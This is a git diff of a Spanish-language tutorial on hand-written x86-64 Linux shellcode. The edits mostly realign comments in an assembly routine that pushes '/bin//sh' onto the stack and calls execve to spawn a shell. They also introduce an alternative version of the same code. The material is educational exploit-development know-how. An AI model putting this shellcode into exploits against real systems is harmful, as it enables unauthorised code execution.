@@ -35,21 +35,21 @@ Codigo en assembly:
 global _start 
 section .text
 _start:
-    xor rax, rax ; primer null , rax=0 ; de RAX sacamos los Ceros
-    push rax ; rsp = 0x000000000000000. 
+    xor rax, rax        ; primer null , rax=0 ; de RAX sacamos los Ceros
+    push rax            ; rsp = 0x000000000000000. 
 
-    mov rbx, 0x68732f2f6e69622f ; /bin//sh (8 bytes, o sea, alineado)
-    push rbx ; rsp:  0x68732f2f6e69622f    0x000000000000000. -> Ahora la pila tiene el primer argumento (/bin//sh, 0x0)
-    mov rdi, rsp ; rdi 0x68732f2f6e69622f /bin//sh -> Esto de la pila lo metemos en rdi como primer argumento
+    mov rbx, 0x68732f2f6e69622f  ; /bin//sh (8 bytes, o sea, alineado)
+    push rbx                     ; rsp:  0x68732f2f6e69622f    0x000000000000000. -> Ahora la pila tiene el primer argumento (/bin//sh, 0x0)
+    mov rdi, rsp                 ; rdi 0x68732f2f6e69622f /bin//sh -> Esto de la pila lo metemos en rdi como primer argumento
 
-    push rax ;           otro null; rsp  0x000000000000000  0x68732f2f6e69622f   0x000000000000000
-    mov rdx, rsp ;       rdx = 0x000000000000000 (Tercer argumento)
+    push rax                ;    otro null; rsp  0x000000000000000  0x68732f2f6e69622f   0x000000000000000
+    mov rdx, rsp            ;    rdx = 0x000000000000000 (Tercer argumento)
 
-    push rdi ;          dirección de /bin/sh en la pila ->  rsp 0x00007fffffffdeb0  0x000000000000000 0x68732f2f6e69622f  0x000000000000000
-    mov rsi, rsp          ; rsi -> 0x7fffffffdea0  (0x68732f2f6e69622f en el stack)
+    push rdi          ;  dirección de /bin/sh en la pila ->  rsp 0x00007fffffffdeb0  0x000000000000000 0x68732f2f6e69622f  0x000000000000000
+    mov rsi, rsp      ; rsi -> 0x7fffffffdea0  (0x68732f2f6e69622f en el stack)
 
-    add rax, 59 ;       Llamamos a execve
-    syscall  ; lo ejecutamos
+    add rax, 59       ;  Llamamos a execve
+    syscall           ; lo ejecutamos
 ```
 Para que entendamos como está puesto todo:  
 - La pila  
@@ -88,7 +88,8 @@ cucuxii
 
 ## Extra: Otra version que funciona
 
-```
+Esto lo meto para ver que pueden haber muchas versiones de lo mismo...
+```asm
 global _start 
 section .text
 
